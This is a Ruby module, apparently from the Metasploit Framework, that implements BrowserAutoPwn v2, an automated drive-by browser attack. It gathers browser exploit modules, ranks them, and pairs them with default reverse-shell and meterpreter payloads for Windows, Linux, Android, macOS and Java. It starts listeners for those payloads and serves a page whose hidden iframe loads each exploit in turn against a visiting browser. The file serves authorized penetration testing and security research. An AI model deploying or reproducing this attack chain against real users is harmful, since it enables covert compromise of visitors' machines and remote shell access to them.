###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn.
# It works with other components such as BrowserExploitServer, BrowserProfileManager, and BES-based
# exploits to perform a faster and smarter automated client-side attack.
#
###

require 'Date'

module Msf
  module Exploit::Remote::BrowserAutopwnv2

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array] A list of initialized BAP exploits
    attr_reader :bap_exploits

    # @return [Array] A list of module job IDs
    attr_reader :module_job_ids


    # The default platform-specific payloads and preferred LPORTS.
    # The hash key is the name of the platform that matches what's on the module.
    # The loader order is specific.
    DEFAULT_PAYLOADS = {
      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',         'lport' => 4449 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp',   'lport' => 4448 },
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp',   'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/x86/meterpreter/reverse_tcp', 'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/x86/shell_reverse_tcp',         'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',      'lport' => 4447 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',         'lport' => 4450 }
    }


    # Returns all the found exploit modules that support BrowserExploitServer by going through all
    # the exploits from the framework object.
    #
    # @return [void]
    def init_exploits
      # First we're going to avoid using #find_all because that gets very slow.
      framework.exploits.each_pair do |fullname, plader_holder|
        next if !fullname.include?('browser') || self.fullname == "exploit/#{fullname}"

        # The user gets to specify which modules to include/exclude
        next if datastore['Include'] && fullname !~ datastore['Include']
        next if datastore['Exclude'] && fullname =~ datastore['Exclude']

        mod = framework.exploits.create(fullname)
        unless mod
          print_status("Failed to load: #{fullname}")
          next
        end
        if mod.kind_of?(Msf::Exploit::Remote::BrowserExploitServer)
          set_exploit_options(mod)
          @bap_exploits << mod
        end
      end
    end


    # Returns a note type that's unique to this BAP.
    # This overrides Msf::Exploit::Remote::BrowserProfileManager#note_type_prefix so that BAP
    # and all of its child exploits can share target information with each other.
    #
    # @return [String]
    def note_type_prefix
      @note_type_prefix ||= "BAP.#{Time.now.to_i}.Client"
    end


    # Removes target information owned by this BAP.
    #
    # @return [void]
    def rm_target_info_notes
      return unless framework.db.active
      ::ActiveRecord::Base.connection_pool.with_connection {
        framework.db.notes.each do |note|
          note.destroy if note.ntype.include?(note_type_prefix)
        end
      }
    end


    # Removes jobs (exploits and payload handlers) that belong to BAP.
    #
    # @return [void]
    def rm_jobs
      module_job_ids.each do |id|
        framework.jobs.stop_job(id)  if framework.jobs[id.to_s]
      end
    end


    # Cleans up everything.
    #
    # @return [void]
    def cleanup
      rm_target_info_notes
      rm_jobs
    end


    # Modifies an exploit's default datastore options.
    #
    # @return [void]
    def set_exploit_options(xploit)
      # We could do a massive xploit.datastore.merge!(self.datastore), but this seems
      # really expensive. Costs more loading time.

      # Set options configurable by the user.
      p = select_payload(xploit)
      xploit.datastore['PAYLOAD']     = p['payload']
      xploit.datastore['LPORT']       = p['lport']
      xploit.datastore['SRVHOST']     = datastore['SRVHOST']
      xploit.datastore['JsObfuscate'] = datastore['JsObfuscate'] if datastore['JsObfuscate']
      xploit.datastore['CookieName']  = datastore['CookieName'] if datastore['CookieName']
      xploit.datastore['VERBOSE']     = datastore['VERBOSE'] if datastore['VERBOSE']
      xploit.datastore['Retries']     = datastore['Retries'] if datastore['Retries']
      xploit.datastore['SSL']         = datastore['SSL'] if datastore['SSL']
      xploit.datastore['SSLVersion']  = datastore['SSLVersion'] if datastore['SSLVersion']
      xploit.datastore['LHOST']       = get_payload_lhost

      # Set options only configurable by BAP.
      xploit.datastore['DisablePayloadHandler'] = true
      xploit.datastore['NoteTypePrefix']        = note_type_prefix
      xploit.datastore['URIPATH']               = "/#{assign_module_resource}"
      xploit.datastore['MODULEOWNER']           = Msf::Exploit::Remote::BrowserAutopwnv2
    end


    # Checks if a resource is already taken or not.
    #
    # @return [TrueClass] Resource is taken.
    # @return [FalseClass] Resource is not taken.
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        return true if m.datastore['URI'] == resource
      end

      taken
    end


    # Returns a unique resource path.
    #
    # @return [String] A unique resource path.
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Modifies @bap_exploits by sorting. The newest and with the highest ranking goes on top.
    #
    # @see #bap_exploits The read-only attribute.
    # @see #sort_date_in_group The method for sorting by disclosure date
    # @see #sort_group_by_rank The method for sorting by rank
    # @see #sort_bap_modules The method for breaking the module list into groups
    # @see #finalize_sorted_modules The method for finalizing bap_exploits
    # @return [void]
    def sort_bap_exploits
      bap_groups = group_bap_modules
      bap_groups = sort_date_in_group(bap_groups)
      bap_groups = sort_group_by_rank(bap_groups)
      finalize_sorted_modules(bap_groups)
    end


    # Sorts a grouped module list by disclosure date.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash with each module list sorted by disclosure date.
    def sort_date_in_group(bap_groups)
      bap_groups.each_pair do |ranking, module_list|
        bap_groups[ranking] = module_list.sort_by {|m| Date.parse(m.disclosure_date.to_s)}.reverse
      end
    end


    # Sorts a module list by ranking.
    #
    # @param [Hash] A grouped module list.
    # @return [Hash] A hash grouped by ranking.
    def sort_group_by_rank(bap_groups)
      Hash[bap_groups.sort_by {|k,v| k}.reverse]
    end


    # Breaks @bap_exploits into groups for sorting purposes.
    #
    # @return [Hash] A module list grouped by rank.
    def group_bap_modules
      bap_groups = {}
      RankingName.each_pair do |ranking, value|
        bap_groups[ranking] = []
        bap_exploits.each do |m|
          next if m.rank != ranking
          bap_groups[ranking] << m
        end
      end
      bap_groups
    end


    # Modifies @bap_exploit by replacing it with the rearranged module list.
    #
    # @see #bap_exploits The read-only attribute.
    # @param [Hash] A grouped module list.
    # @return [void]
    def finalize_sorted_modules(bap_groups)
      @bap_exploits = []
      bap_groups.each_pair do |ranking, module_list|
        module_list.each do |m|
          break if @bap_exploits.length >= datastore['MaxExploits']
          @bap_exploits << m
        end
      end
    end


    # Verifies with current active modules and see if the payload is wanted.
    #
    # @param [String] payload_name The payload module path (name).
    # @return [TrueClass]
    # @return [FalseClass]
    def is_payload_handler_wanted?(payload_name)
      bap_exploits.each do |m|
        return true if m.datastore['PAYLOAD'] == payload_name
      end

      false
    end


    # Returns a payload name. Either this will be the user's choice, or falls back to a default one.
    #
    # @param [String] platform
    # @return [String]
    def get_selected_payload_name(platform)
      payload_name = datastore["PAYLOAD_#{platform.upcase}"]

      # The payload is legit, we can use it.
      # Avoid #create seems faster
      return payload_name if framework.payloads.keys.include?(payload_name)

      default = DEFAULT_PAYLOADS[platform]['payload']
      print_status("Unknown payload set: #{payload_name}. Falling back to: #{default}.")

      # The user has configured some unknown payload that we can't use,
      # fall back to default.
      default
    end


    # Returns the selected payload's LPORT.
    #
    # @param [String] platform
    # @return [Fixnum]
    def get_selected_payload_lport(platform)
      datastore["PAYLOAD_#{platform.upcase}_LPORT"]
    end


    # Returns the selected payload's LHOST.
    #
    # @return [String]
    def get_payload_lhost
      datastore['LHOST'] || Rex::Socket.source_address
    end


    # Creates payload listeners.
    #
    # @return [void]
    def start_payload_listeners
      DEFAULT_PAYLOADS.each_pair do |platform, listener_info|
        # Exploit failed: firefox/shell_reverse_tcp is not a compatible payload
        next if listener_info['payload'] == 'firefox/shell_reverse_tcp'

        # Don't waste resources. This shaves about a second in loading speed.
        next unless is_payload_handler_wanted?(listener_info['payload'])

        multi_handler = framework.modules.create('exploit/multi/handler')
        # User configurable options
        # We could do a massive multi_handler.datastore.merge!(self.datastore), but this seems
        # really expensive. Costs more loading time.
        multi_handler.datastore['LHOST']                = get_payload_lhost
        multi_handler.datastore['PAYLOAD']              = get_selected_payload_name(platform)
        multi_handler.datastore['LPORT']                = get_selected_payload_lport(platform)
        multi_handler.datastore['DebugOptions']         = datastore['DebugOptions'] if datastore['DebugOptions']
        multi_handler.datastore['AutoLoadAndroid']      = datastore['AutoLoadAndroid'] if datastore['AutoLoadAndroid']
        multi_handler.datastore['PrependMigrate']       = datastore['PrependMigrate'] if datastore['PrependMigrate']
        multi_handler.datastore['PrependMigrateProc']   = datastore['PrependMigrateProc'] if datastore['PrependMigrateProc']
        multi_handler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript'] if datastore['InitialAutoRunScript']
        multi_handler.datastore['AutoRunScript']        = datastore['AutoRunScript'] if datastore['AutoRunScript']

        # Configurable only by BAP
        multi_handler.datastore['EXITONSESSION'] = false
        multi_handler.datastore['EXITFUNC']      = 'thread'
        multi_handler.datastore['MODULEOWNER']   = Msf::Exploit::Remote::BrowserAutopwnv2

        # Now we're ready to start the handler
        multi_handler.exploit_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'Payload' => listener_info['payload'],
          'RunAsJob' => true
        )
        @module_job_ids << multi_handler.job_id
      end
    end


    # Returns the human-readable version of the rank.
    #
    # @param [Fixnum] rank
    # @return [String]
    def parse_rank(rank)
      RankingName[rank].to_s.capitalize
    end


    # Returns the selected payload.
    #
    # @param [Object] A module that's been initialized.
    # @return [String] Payload name. Example: 'windows/meterpreter/reverse_tcp'
    def select_payload(m)
      selected_payload = DEFAULT_PAYLOADS['generic']
      DEFAULT_PAYLOADS.each_pair do |p, info|
        preferred = info['payload']
        m.compatible_payloads.each do |k|
          return info if k[0] == preferred
        end
      end

      selected_payload
    end


    # Starts exploits.
    #
    # @return [void]
    def start_exploits
      bap_exploits.each do |m|
        m.exploit_simple(
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'Target'      => 0,
          'Payload'     => m.datastore['PAYLOAD'],
          'RunAsJob'    => true
        )
        @module_job_ids << m.job_id
      end
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @return [void]
    def setup
      t1 = Time.now
      self.datastore['MODULEOWNER'] = Msf::Exploit::Remote::BrowserAutopwnv2
      self.datastore['DisablePayloadHandler'] = true
      super
      @bap_exploits = []
      @module_job_ids = []

      print_status("Searching BES exploits, please wait...")
      init_exploits
      sort_bap_exploits

      print_status("Starting exploit modules...")
      start_exploits

      print_status("Starting listeners...")
      start_payload_listeners

      t2 = Time.now
      print_line
      print_status("Time spent: #{(t2-t1).inspect}")
    end


    # Prints all the exploits that BAP will consider using.
    #
    # @return [void]
    def show_ready_exploits
      columns = ['Order', 'Rank', 'Name', 'Path', 'Payload']

      # If not verbose, you're not in dev mode.
      # As an user, you shouldn't be using any of these paths anyway.
      columns.delete('Path') if !datastore['VERBOSE']

      table = Rex::Ui::Text::Table.new(
        'Header'  => 'Exploits',
        'Indent'  => 1,
        'Columns' => columns
      )

      # Without the order, sometimes the Rex table messes up even though in the array
      # the order looks right. So don't get rid of this.
      order = 1

      bap_exploits.each do |m|
        row = []
        row << order
        row << parse_rank(m.rank)
        row << m.shortname
        row << m.datastore['URIPATH'] if datastore['VERBOSE']
        row << "#{m.datastore['PAYLOAD']} on #{m.datastore['LPORT']}"
        table << row
        order += 1
      end

      print_line
      print_status("The following is a list of exploits that BrowserAutoPwn will consider using.")
      print_status("Exploits with the highest ranking and newest will be tried first.")
      print_line
      print_line table.to_s
    end


    # Prints information such as what exploits will be used, and the BAP URL.
    #
    # @return [void]
    def start_service
      super
      show_ready_exploits
      print_status("Please use the following URL for the browser attack:")
      print_status("BrowserAutoPwn URL: #{self.get_uri}")
    end


    # Prints all user-configurable payloads. It's the same as the "show payloads" command in console.
    #
    # @return [void]
    def show_payloads
      DEFAULT_PAYLOADS.keys.each do |platform|
        payload_name = get_selected_payload_name(platform)
        p = framework.payloads.create(payload_name)
        p.datastore['LHOST'] = get_payload_lhost
        p.datastore['LPORT'] = get_selected_payload_lport(platform)
        next unless p
        p_opt = Serializer::ReadableText.dump_options(p, '   ')
        print("\nPayload options (#{payload_name}):\n\n#{p_opt}\n") if (p_opt and p_opt.length > 0)
      end
    end


    # Prints a message that explains how the user should set a payload. This is the same as the
    # "set payload" command in console.
    #
    # @return [void]
    def set_payload
      print_status("'set payload' has been disabled for BrowserAutoPwn.")
      print_status('You should set a platform-specific payload instead via advanced options:')
      print_line
      table = Rex::Ui::Text::Table.new(
        'Header'  => 'Advanced Options',
        'Indent'  => 1,
        'Columns' => ['Option Name', 'Description']
      )
      DEFAULT_PAYLOADS.each_pair do |platform, payload_info|
        table << ["PAYLOAD_#{platform.upcase}", "Payload for #{platform} browser exploits"]
      end
      print_line(table.to_s)
      print_status("Example: set PAYLOAD_WIN windows/meterpreter/reverse_tcp")
      print_line
      print_status("For a list of payloads, you can do: show payloads")
      print_status("You can also see 'show advanced' for more options.")
    end


    # Returns a list of suitable exploits for the current client. It will do a global exploitable
    # requirement check.
    #
    # @param cli [Socket] Socket for the browser
    # @param request [Rex::Proto::Http::Request] The HTTP request sent by the browser
    # @return [Array]
    def get_suitable_exploits(cli, request)
      current_exploit_list = []
      tag = retrieve_tag(cli, request)
      profile_info = get_profile_info(tag)
      bap_exploits.each do |m|
        if m.get_bad_requirements(profile_info).empty?
          current_exploit_list << m
        end
      end

      if datastore['RealList']
        show_real_list(cli.peerhost, tag, current_exploit_list)
      end

      current_exploit_list
    end


    def show_real_list(ip, tag, current_exploit_list)
      order = 1
      table = Rex::Ui::Text::Table.new(
        'Header'  => '',
        'Indent'  => 1,
        'Columns' => ['Order', 'IP', 'Exploit']
      )
      current_exploit_list.each do |m|
        table << [order, ip, m.shortname]
        order += 1
      end
      print_status("Exploits found suitable for #{cli.peerhost} (Tag: #{tag})#{table}")
    end


    # Returns a list of exploit URLs.
    #
    # @param cli [Socket] Socket for the browser
    # @param request [Rex::Proto::Http::Request] The HTTP request sent by the browser
    # @return [Array]
    def get_exploit_urls(cli, request)
      urls = []

      exploit_list = get_suitable_exploits(cli, request)

      exploit_list.each do |mod|
        proto = datastore['SSL'] ? 'https' : 'http'
        host = datastore['URIHOST'] || Rex::Socket.source_address
        port = datastore['SRVPORT']
        resource = mod.datastore['URIPATH']
        url = "#{proto}://#{host}:#{port}#{resource}"
        urls << url
      end

      urls
    end


    # Returns the HTML that the client will get.
    #
    # @param cli [Socket] Socket for the browser
    # @param request [Rex::Proto::Http::Request] The HTTP request sent by the browser
    # @return [String]
    def build_html(cli, request)
      js = %Q|
      var currentIndex = 0;
      var exploitList = [#{get_exploit_urls(cli, request).map! {|e| "'#{e}'"} * ", "}];

      window.onload = function() {
        var e = document.createElement("iframe");
        e.setAttribute("id", "myiframe");
        if (typeof e.style.setAttribute == 'undefined') {
          e.setAttribute("style", "visibility:hidden;height:0;width:0;border:0");
        } else {
          e.style.setAttribute("visibility", "hidden");
          e.style.setAttribute("height", "0");
          e.style.setAttribute("width", "0");
          e.style.setAttribute("border", "0");
        }
        document.body.appendChild(e);
        setTimeout("loadExploit(currentIndex)", 1000);
      }

      function loadExploit(i) {
        var e = document.getElementById("myiframe");
        e.setAttribute("src", exploitList[i]);
        currentIndex += 1;
      }
      |

      %Q|<html>
      <head>
      <script>
      #{js}
      </script>
      </head>
      <body>
      </body>
      </html>
      #{datastore['Content']}|
    end

  end
end
